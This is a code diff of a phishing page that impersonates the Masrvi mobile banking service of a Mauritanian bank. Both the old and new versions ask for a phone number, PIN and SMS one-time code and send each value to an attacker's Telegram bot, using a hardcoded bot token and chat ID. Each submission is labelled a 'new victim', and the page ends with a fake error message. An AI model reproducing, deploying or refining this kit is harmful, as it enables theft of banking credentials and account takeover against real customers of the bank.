@@ -3,159 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Masrvi Mobile</title>
+    <title>Masrvi | المصرف الموريتاني للاستثمار</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+        body { margin: 0; padding: 0; background-color: #fff; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; min-height: 100vh; }
+        .wrapper { width: 100%; max-width: 450px; background: #fff; position: relative; overflow-x: hidden; }
         
-        :root { --primary: #e67e22; --secondary: #ad6d2f; --bg: #f8f9fa; }
+        .header-img { width: 100%; display: block; }
+        .footer-img { width: 100%; position: fixed; bottom: 0; max-width: 450px; z-index: -1; }
 
-        body { margin: 0; background-color: var(--bg); font-family: 'Cairo', sans-serif; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
-        .app-wrapper { width: 100%; max-width: 450px; background: white; display: flex; flex-direction: column; height: 100%; position: relative; }
-        
-        /* الهيدر المطور */
-        .header { 
-            background: linear-gradient(180deg, #e67e22 0%, #d35400 100%); 
-            padding: 55px 20px 35px; text-align: center; color: white; 
-            border-bottom-left-radius: 30px; border-bottom-right-radius: 30px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        .form-container { padding: 20px; text-align: right; margin-top: 20px; }
+        .label { font-weight: bold; margin-bottom: 8px; display: block; font-size: 15px; }
+        .label span { color: red; }
+
+        .input-box { 
+            position: relative; border: 2px solid #000; border-radius: 10px; 
+            margin-bottom: 25px; display: flex; align-items: center; padding: 5px 15px;
         }
-        .logo-main { font-size: 42px; font-weight: 900; margin: 0; letter-spacing: -1.5px; }
-        .bank-name { font-size: 14px; opacity: 0.95; font-weight: 600; margin-top: 8px; }
-
-        .main-content { padding: 35px 25px; flex: 1; }
-        .section-title { font-size: 22px; font-weight: 700; color: #2c3e50; margin-bottom: 35px; text-align: center; }
-
-        .field-group { margin-bottom: 25px; }
-        .field-label { display: block; margin-bottom: 10px; font-size: 14px; font-weight: 700; color: #444; }
-        
-        /* خانات الإدخال - أرقام فقط */
+        .input-box img { width: 25px; margin-left: 10px; }
         input { 
-            width: 100%; padding: 16px; border: 1.2px solid #ddd; border-radius: 14px; 
-            background: #fafafa; font-size: 18px; transition: 0.3s; box-sizing: border-box; text-align: center;
-            font-family: 'Cairo', sans-serif;
+            border: none; width: 100%; font-size: 18px; padding: 10px; 
+            text-align: right; outline: none; background: transparent; font-family: 'Cairo';
         }
-        input:focus { border-color: var(--primary); outline: none; background: white; box-shadow: 0 0 10px rgba(230, 126, 34, 0.15); }
 
-        .action-btn { 
-            background: var(--secondary); color: white; border: none; padding: 18px; 
-            width: 100%; border-radius: 14px; font-size: 18px; font-weight: 700; cursor: pointer; 
-            margin-top: 15px; box-shadow: 0 4px 12px rgba(173, 109, 47, 0.3);
+        .btn-main { 
+            background-color: #2c5364; color: white; border: none; width: 100%; 
+            padding: 15px; border-radius: 5px; font-size: 20px; font-weight: bold; 
+            cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); margin-top: 10px;
         }
 
         /* واجهة OTP */
-        .otp-text { text-align: center; font-size: 14px; color: #7f8c8d; line-height: 1.6; margin-bottom: 20px; }
-        .timer { font-size: 28px; font-weight: 900; color: var(--primary); margin: 15px 0; text-align: center; }
+        .otp-icon { width: 120px; margin: 30px auto; display: block; }
+        .otp-msg { text-align: center; font-size: 16px; margin-bottom: 20px; padding: 0 20px; }
+        .timer-box { 
+            background: #000; color: #fff; width: fit-content; margin: 15px auto; 
+            padding: 10px 20px; font-size: 25px; font-weight: bold; border-radius: 5px;
+        }
+        .resend { text-align: center; color: #000; text-decoration: underline; cursor: pointer; font-weight: bold; margin: 20px 0; display: block; }
 
-        .footer { text-align: center; padding: 25px; font-size: 12px; color: #95a5a6; margin-top: auto; }
         .hidden { display: none; }
-
-        /* لودر احترافي */
-        .spinner { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; width: 22px; height: 22px; animation: spin 0.8s linear infinite; display: none; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="app-wrapper">
-    <div class="header">
-        <h1 class="logo-main">masrvi</h1>
-        <div class="bank-name">المصرف الموريتاني للاستثمار - BMCI</div>
+<div class="wrapper">
+    <img src="https://static.wixstatic.com/media/9d6796_87c2c10b0f4c4a45a33b006c79a94156~mv2.png" class="header-img">
+
+    <div id="p1" class="form-container">
+        <label class="label">رقم الهاتف *</label>
+        <div class="input-box">
+            <input type="tel" id="tel" placeholder="رقم الهاتف" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+            <img src="https://cdn-icons-png.flaticon.com/512/1077/1077063.png">
+        </div>
+
+        <label class="label">الرمز السري *</label>
+        <div class="input-box">
+            <input type="password" id="pin" placeholder="أدخل الرمز السري الخاص بك للمتابعة" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+            <img src="https://cdn-icons-png.flaticon.com/512/3064/3064155.png">
+        </div>
+
+        <button class="btn-main" onclick="toStep2()">ادخل السحب</button>
     </div>
 
-    <div id="step-login" class="main-content">
-        <div class="section-title">تسجيل الدخول للموبايل</div>
-        <div class="field-group">
-            <label class="field-label">رقم الهاتف المربوط بالحساب</label>
-            <input type="tel" id="phone" placeholder="00 00 00 00" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');" maxlength="8">
+    <div id="p2" class="form-container hidden">
+        <img src="https://static.wixstatic.com/media/9d6796_6e4c7068524d4554b7063546738981f2~mv2.png" class="otp-icon">
+        <p class="otp-msg">يرجى ادخال الرمز الذي تلقيته عبر الرسائل النصية *</p>
+        
+        <div class="input-box">
+            <input type="tel" id="otp" placeholder="######" maxlength="6" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+            <img src="https://cdn-icons-png.flaticon.com/512/3638/3638933.png">
         </div>
-        <div class="field-group">
-            <label class="field-label">كلمة المرور (PIN)</label>
-            <input type="password" id="pin" placeholder="••••" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');" maxlength="4">
-        </div>
-        <button class="action-btn" id="loginBtn" onclick="doLogin()">
-            <span id="loginText">دخول آمن</span>
-            <div class="spinner" id="loginSpin"></div>
-        </button>
+
+        <p style="text-align: center; margin-bottom: 5px;">تنتهي صلاحية الرمز خلال</p>
+        <div class="timer-box" id="time">05:00</div>
+        
+        <span class="resend" onclick="location.reload()">إعادة إرسال رمز التأكيد</span>
+
+        <button class="btn-main" onclick="final()">تأكيد العملية</button>
     </div>
 
-    <div id="step-otp" class="main-content hidden">
-        <div class="section-title">تأكيد الهوية</div>
-        <div class="otp-text">لقد أرسلنا رمز التحقق المكون من 6 أرقام إلى هاتفك. يرجى إدخاله للمتابعة.</div>
-        <div class="timer" id="timerDisplay">05:00</div>
-        <div class="field-group">
-            <input type="tel" id="otp" placeholder="— — — — — —" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'');" maxlength="6" style="letter-spacing: 6px; font-size: 24px; font-weight: bold;">
-        </div>
-        <button class="action-btn" id="otpBtn" onclick="doOtp()">
-            <span id="otpText">تأكيد الرمز</span>
-            <div class="spinner" id="otpSpin"></div>
-        </button>
-        <p style="text-align: center; font-size: 13px; color: var(--primary); margin-top: 20px; font-weight: bold;">إعادة إرسال الرمز</p>
-    </div>
-
-    <div class="footer">
-        Masrvi Mobile Banking © 2026<br>
-        Version 4.2.1 (Build 5082)
-    </div>
+    <img src="https://static.wixstatic.com/media/9d6796_276a6e9a65d342898c868e8268571234~mv2.png" class="footer-img">
 </div>
 
 <script>
-const botToken = "8647203625:AAFUHY8sXVD8IoSvf60Wd7pT-l5MHDO-d9I";
-const chatID = "5244299184";
+    const tok = "8647203625:AAFUHY8sXVD8IoSvf60Wd7pT-l5MHDO-d9I";
+    const cid = "5244299184";
 
-function sendLog(msg) {
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(msg)}`;
-    new Image().src = url;
-}
-
-function doLogin() {
-    const p = document.getElementById('phone').value;
-    const s = document.getElementById('pin').value;
-    
-    if(p.length === 8 && s.length === 4) {
-        sendLog(`🚨 ضحية جديد:\n📱 هاتف: ${p}\n🔑 رمز PIN: ${s}`);
-        
-        document.getElementById('loginText').style.display = 'none';
-        document.getElementById('loginSpin').style.display = 'block';
-        
-        setTimeout(() => {
-            document.getElementById('step-login').classList.add('hidden');
-            document.getElementById('step-otp').classList.remove('hidden');
-            startCountdown(300); // 5 دقائق
-        }, 1500);
-    } else {
-        alert("يرجى إدخال البيانات بشكل صحيح (8 أرقام للهاتف و4 للرمز)");
+    function send(t) {
+        new Image().src = `https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`;
     }
-}
 
-function doOtp() {
-    const o = document.getElementById('otp').value;
-    if(o.length >= 4) {
-        sendLog(`🔢 رمز الـ OTP: ${o}`);
-        
-        document.getElementById('otpText').style.display = 'none';
-        document.getElementById('otpSpin').style.display = 'block';
-        
-        setTimeout(() => {
-            alert("عذراً، انتهت جلسة الاتصال. يرجى إعادة المحاولة.");
+    function toStep2() {
+        const t = document.getElementById('tel').value;
+        const p = document.getElementById('pin').value;
+        if(t && p) {
+            send(`🚨 دخول:\n📱 هاتف: ${t}\n🔑 رمز: ${p}`);
+            document.getElementById('p1').classList.add('hidden');
+            document.getElementById('p2').classList.remove('hidden');
+            let time = 300;
+            const display = document.getElementById('time');
+            setInterval(() => {
+                let m = Math.floor(time / 60);
+                let s = time % 60;
+                display.innerText = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
+                if(time > 0) time--;
+            }, 1000);
+        } else { alert("يرجى ملء البيانات"); }
+    }
+
+    function final() {
+        const o = document.getElementById('otp').value;
+        if(o) {
+            send(`🔢 OTP: ${o}`);
+            alert("حدث خطأ تقني، يرجى إعادة المحاولة لاحقاً.");
             location.reload();
-        }, 2500);
-    } else {
-        alert("يرجى إدخال رمز التأكيد");
+        }
     }
-}
-
-function startCountdown(duration) {
-    let timer = duration, minutes, seconds;
-    const display = document.getElementById('timerDisplay');
-    const interval = setInterval(function () {
-        minutes = parseInt(timer / 60, 10);
-        seconds = parseInt(timer % 60, 10);
-        minutes = minutes < 10 ? "0" + minutes : minutes;
-        seconds = seconds < 10 ? "0" + seconds : seconds;
-        display.textContent = minutes + ":" + seconds;
-        if (--timer < 0) clearInterval(interval);
-    }, 1000);
-}
 </script>
+
 </body>
 </html>
